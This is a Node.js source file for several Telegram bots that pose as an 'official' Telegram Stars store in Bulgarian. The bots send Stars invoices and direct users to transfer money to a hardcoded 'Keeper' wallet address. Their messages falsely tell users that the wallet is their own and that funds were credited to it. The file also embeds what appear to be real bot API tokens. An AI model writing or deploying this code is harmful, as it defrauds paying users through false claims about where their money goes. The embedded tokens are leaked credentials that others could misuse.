const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);

        bot.start(async (ctx) => {
            const userName = ctx.from.first_name || 'Приятел';
            
            const storeCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
                `Здравей, **${userName}**!\n` +
                `Избери пакет звезди за плащане и пазаруване:\n\n` +
                `💎 Наличен бюджет: 3,100 Stars\n` +
                `💼 Keeper Wallet: \`${KEEPER_WALLET}\``;

            const storeKeyboard = Markup.inlineKeyboard([
                [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
                [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
                [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
                [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
                [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
                [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50050')],
                [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
                [Markup.button.url('💳 Зареди Stars в Telegram', 'https://t.me/premium')],
                [Markup.button.callback('💰 Прехвърли към Keeper', 'withdraw_keeper')]
            ]);

            try {
                await ctx.replyWithPhoto(mainCoverImage, {
                    caption: storeCaption,
                    parse_mode: 'Markdown',
                    ...storeKeyboard
                });
            } catch (err) {
                // Ако снимката не се зареди, праща само текста с бутоните
                await ctx.reply(storeCaption, {
                    parse_mode: 'Markdown',
                    ...storeKeyboard
                });
            }
        });

        const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50050', 'buy_150000'];

        bot.action(packageActions, async (ctx) => {
            await ctx.answerCbQuery();
            const action = ctx.match;
            let count = 250;
            if (action === 'buy_500') count = 500;
            if (action === 'buy_1000') count = 1000;
            if (action === 'buy_2500') count = 2500;
            if (action === 'buy_10000') count = 10000;
            if (action === 'buy_50050') count = 50050;
            if (action === 'buy_150000') count = 150000;

            try {
                await ctx.replyWithInvoice({
                    title: `Пакет ${count} Telegram Stars`,
                    description: `Закупуване на ${count} звезди през менюто за пазаруване.`,
                    payload: `store_${count}_${Date.now()}`,
                    currency: 'XTR',
                    prices: [{ label: `${count} Stars`, amount: count }]
                });
            } catch (e) {
                await ctx.reply(
                    `⭐ **ПАКЕТ: ${count} Telegram Stars**\n\n` +
                    `Закупи звезди от тук: https://t.me/premium\n` +
                    `Или преведи сумата към твоя Keeper портфейл:\n\`${KEEPER_WALLET}\``,
                    { parse_mode: 'Markdown' }
                );
            }
        });

        bot.action('withdraw_keeper', async (ctx) => {
            await ctx.answerCbQuery('Сверяване...');
            await ctx.reply(
                `💰 **ПРЕХВЪРЛЯНЕ КЪМ KEEPER ПОРТФЕЙЛ**\n\n` +
                `Средствата са насочени към портфейла ти:\n\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.on('pre_checkout_query', async (ctx) => {
            try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
        });

        bot.on('successful_payment', async (ctx) => {
            const payment = ctx.message.successful_payment;
            await ctx.reply(`🎉 Успешна покупка на ${payment.total_amount} Stars! Средствата са свързани с Keeper портфейла.`);
        });

        bot.launch();
    } catch (e) {}
});

app.get('/', (req, res) => res.json({ status: "STORE ACTIVE" }));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
